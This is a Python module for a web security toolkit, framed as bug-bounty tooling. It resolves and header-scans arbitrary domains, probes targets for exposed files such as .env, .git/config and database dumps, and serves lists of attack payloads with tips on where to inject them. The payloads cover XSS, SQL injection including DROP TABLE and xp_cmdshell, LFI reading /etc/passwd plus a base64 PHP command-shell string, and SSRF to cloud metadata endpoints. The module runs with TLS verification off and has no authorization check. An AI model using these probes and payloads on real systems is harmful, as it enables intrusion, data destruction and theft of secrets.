import socket
import urllib.request
import urllib.parse
import urllib.error
import ssl
import json
from typing import Optional


# ── Constants ──────────────────────────────────────────────────────────────────

SECURITY_HEADERS = [
    "strict-transport-security",
    "content-security-policy",
    "x-frame-options",
    "x-content-type-options",
    "referrer-policy",
    "permissions-policy",
    "x-xss-protection",
]

TECH_HEADERS = {
    "server":           "Web server",
    "x-powered-by":     "Backend language/framework",
    "x-aspnet-version": "ASP.NET version exposed",
    "x-generator":      "CMS/generator",
    "via":              "Proxy/CDN",
    "cf-ray":           "Cloudflare",
    "x-vercel-id":      "Vercel",
    "x-amz-request-id": "AWS",
    "x-cache":          "Caching layer",
}

COMMON_PATHS = [
    "/admin", "/admin/login", "/administrator",
    "/api", "/api/v1", "/api/v2",
    "/login", "/signin", "/auth",
    "/backup", "/backup.zip", "/db.sql",
    "/.env", "/.git/config", "/config.php",
    "/robots.txt", "/sitemap.xml",
    "/swagger", "/swagger-ui", "/openapi.json", "/api/docs",
    "/phpmyadmin", "/wp-admin", "/wp-login.php",
    "/debug", "/status", "/health", "/metrics",
    "/console", "/shell",
]

PAYLOADS = {
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "'\"><script>alert(document.domain)</script>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "'-alert(1)-'",
        "\"><img src=1 onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<iframe src=javascript:alert(1)>",
    ],
    "sqli": [
        "' OR '1'='1",
        "' OR 1=1 --",
        "\" OR \"1\"=\"1",
        "admin'--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "1; DROP TABLE users--",
        "' AND SLEEP(5)--",
        "' AND 1=2 UNION SELECT table_name FROM information_schema.tables--",
        "'; EXEC xp_cmdshell('whoami')--",
    ],
    "lfi": [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "/etc/passwd",
        "....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252fetc%252fpasswd",
        "/proc/self/environ",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7",
    ],
    "ssrf": [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://2130706433/",          # 127.0.0.1 in decimal
        "http://0177.0.0.1/",          # octal
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
        "dict://127.0.0.1:6379/info",
    ],
}


# ── Helpers ────────────────────────────────────────────────────────────────────

def _make_request(url: str, timeout: int = 6) -> tuple[Optional[object], Optional[str]]:
    """Returns (response, error_str). Handles SSL errors gracefully."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, headers={"User-Agent": "CyberTools-API/1.0"})
    try:
        res = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return res, None
    except urllib.error.HTTPError as e:
        return e, None
    except Exception as e:
        return None, str(e)


def _headers_dict(response) -> dict:
    """Convert http.client.HTTPMessage to plain dict."""
    return dict(response.headers)


def _missing_security_headers(headers: dict) -> list[str]:
    lower = {k.lower() for k in headers}
    return [h for h in SECURITY_HEADERS if h not in lower]


def _tech_hints(headers: dict) -> list[str]:
    hints = []
    lower_headers = {k.lower(): v for k, v in headers.items()}
    for header, label in TECH_HEADERS.items():
        if header in lower_headers:
            hints.append(f"{label}: {lower_headers[header]}")
    return hints


# ── Recon ──────────────────────────────────────────────────────────────────────

def recon_domain(domain: str) -> dict:
    domain = domain.strip().removeprefix("https://").removeprefix("http://").split("/")[0]

    # 1. IP resolution
    try:
        ip = socket.gethostbyname(domain)
    except socket.gaierror as e:
        return {"error": f"DNS resolution failed: {e}"}

    # 2. HTTP probe
    url = f"https://{domain}"
    res, err = _make_request(url)
    if res is None:
        url = f"http://{domain}"
        res, err = _make_request(url)

    status_code = None
    headers = {}
    if res is not None:
        status_code = res.status if hasattr(res, "status") else res.code
        headers = _headers_dict(res)

    # 3. Analysis
    missing_sec = _missing_security_headers(headers)
    tech = _tech_hints(headers)

    # 4. Smart summary
    summary = []
    if status_code:
        summary.append(f"Host is reachable (HTTP {status_code}).")
    else:
        summary.append(f"Could not reach host over HTTP/HTTPS. Error: {err}")

    if missing_sec:
        summary.append(f"Missing {len(missing_sec)} security header(s): {', '.join(missing_sec)}.")
    else:
        summary.append("All major security headers are present.")

    if tech:
        summary.append(f"Detected technologies: {'; '.join(tech)}.")
        if any("ASP.NET" in t or "PHP" in t or "x-powered-by" in t.lower() for t in tech):
            summary.append("Backend version info exposed in headers — information disclosure risk.")

    lower_h = {k.lower(): v for k, v in headers.items()}
    if "strict-transport-security" not in lower_h:
        summary.append("HSTS not set — users may be downgraded to HTTP.")
    if "content-security-policy" not in lower_h:
        summary.append("No CSP header — XSS attacks may be easier.")
    if "x-frame-options" not in lower_h:
        summary.append("No X-Frame-Options — site may be vulnerable to clickjacking.")

    return {
        "domain": domain,
        "ip": ip,
        "status_code": status_code,
        "headers": headers,
        "missing_security_headers": missing_sec,
        "tech_hints": tech,
        "smart_summary": summary,
    }


# ── URL Analyzer ───────────────────────────────────────────────────────────────

def analyze_url(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    redirect_chain = []
    current = url
    max_redirects = 8

    for _ in range(max_redirects):
        res, err = _make_request(current)
        if res is None:
            break
        code = res.status if hasattr(res, "status") else res.code
        redirect_chain.append({"url": current, "status": code})
        location = res.headers.get("Location") or res.headers.get("location")
        if location and code in (301, 302, 303, 307, 308):
            current = location if location.startswith("http") else urllib.parse.urljoin(current, location)
        else:
            break

    final_res, _ = _make_request(current)
    final_headers = _headers_dict(final_res) if final_res else {}
    final_status = (final_res.status if hasattr(final_res, "status") else final_res.code) if final_res else None

    missing_sec = _missing_security_headers(final_headers)
    lower_h = {k.lower(): v for k, v in final_headers.items()}

    misconfig_hints = []
    if "strict-transport-security" not in lower_h:
        misconfig_hints.append("HSTS missing — HTTP downgrade possible.")
    if "x-frame-options" not in lower_h:
        misconfig_hints.append("Clickjacking risk — X-Frame-Options not set.")
    if "x-content-type-options" not in lower_h:
        misconfig_hints.append("MIME-sniffing risk — X-Content-Type-Options missing.")
    if lower_h.get("access-control-allow-origin") == "*":
        misconfig_hints.append("CORS wildcard (*) — any origin can read responses.")
    if "x-powered-by" in lower_h:
        misconfig_hints.append(f"Tech stack exposed via X-Powered-By: {lower_h['x-powered-by']}")
    if "server" in lower_h:
        misconfig_hints.append(f"Server header exposed: {lower_h['server']}")

    summary = []
    if len(redirect_chain) > 1:
        summary.append(f"URL redirects {len(redirect_chain)-1} time(s) before landing at {current}.")
    if misconfig_hints:
        summary.append(f"{len(misconfig_hints)} misconfiguration(s) found.")
    summary += misconfig_hints[:3]  # top 3 in summary

    return {
        "original_url": url,
        "final_url": current,
        "final_status": final_status,
        "redirect_chain": redirect_chain,
        "final_headers": final_headers,
        "missing_security_headers": missing_sec,
        "misconfig_hints": misconfig_hints,
        "smart_summary": summary,
    }


# ── Bug Bounty Scanner ─────────────────────────────────────────────────────────

def bb_scan(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    base = url.rstrip("/")
    found_paths = []
    probed = []

    for path in COMMON_PATHS:
        target = base + path
        res, err = _make_request(target)
        if res is not None:
            code = res.status if hasattr(res, "status") else res.code
            probed.append({"path": path, "status": code})
            if code not in (404, 403):
                found_paths.append({"path": path, "status": code})
        else:
            probed.append({"path": path, "status": "error"})

    hints = [
        "Try fuzzing query parameters with SQLi/XSS payloads from /payloads.",
        "Check /robots.txt for disallowed paths — often reveals hidden endpoints.",
        "Test all input fields for reflected XSS.",
        "Look for IDOR by changing numeric IDs in API paths.",
        "Check if API endpoints return data without auth (BOLA/IDOR).",
        "Test file upload endpoints for unrestricted upload vulnerabilities.",
        "Look for exposed .env, .git, backup files.",
        "Check CORS policy: does it reflect arbitrary Origins?",
        "Test rate limiting on login/auth endpoints.",
        "Check if admin paths return 403 — still confirms existence, worth escalating.",
    ]

    summary = []
    if found_paths:
        summary.append(f"{len(found_paths)} non-404 path(s) found — investigate manually.")
        for p in found_paths[:5]:
            summary.append(f"  {p['path']} → HTTP {p['status']}")
    else:
        summary.append("No obviously exposed paths found. Try deeper fuzzing with a wordlist.")
    summary.append("Use /payloads?type=xss and /payloads?type=sqli to get test payloads.")

    return {
        "target": url,
        "paths_probed": len(probed),
        "interesting_paths": found_paths,
        "all_results": probed,
        "bug_bounty_hints": hints,
        "smart_summary": summary,
    }


# ── Payload Generator ──────────────────────────────────────────────────────────

def get_payloads(ptype: str) -> dict:
    ptype = ptype.lower().strip()
    if ptype not in PAYLOADS:
        return {
            "error": f"Unknown type '{ptype}'. Choose from: {list(PAYLOADS.keys())}",
            "available": list(PAYLOADS.keys()),
        }

    descriptions = {
        "xss":  "Cross-Site Scripting — inject into input fields, URL params, headers.",
        "sqli": "SQL Injection — inject into login forms, search bars, ID parameters.",
        "lfi":  "Local File Inclusion — inject into file path parameters.",
        "ssrf": "Server-Side Request Forgery — inject into URL/webhook/import fields.",
    }

    usage_tips = {
        "xss":  ["Test in URL params (?q=PAYLOAD)", "Try in form inputs", "Test in HTTP headers like Referer/User-Agent if reflected"],
        "sqli": ["Try in login username/password fields", "Test in search boxes", "Add to numeric ID params like ?id=1PAYLOAD"],
        "lfi":  ["Replace file path params like ?page=PAYLOAD", "Try in language/template params", "Combine with PHP wrappers if PHP site"],
        "ssrf": ["Inject into URL/callback/webhook fields", "Try in import/fetch/ping functionality", "Test file:// and dict:// schemes too"],
    }

    return {
        "type": ptype,
        "description": descriptions[ptype],
        "count": len(PAYLOADS[ptype]),
        "payloads": PAYLOADS[ptype],
        "usage_tips": usage_tips[ptype],
        "smart_summary": [
            f"{len(PAYLOADS[ptype])} {ptype.upper()} payloads ready.",
            descriptions[ptype],
            f"Tip: {usage_tips[ptype][0]}",
        ],
    }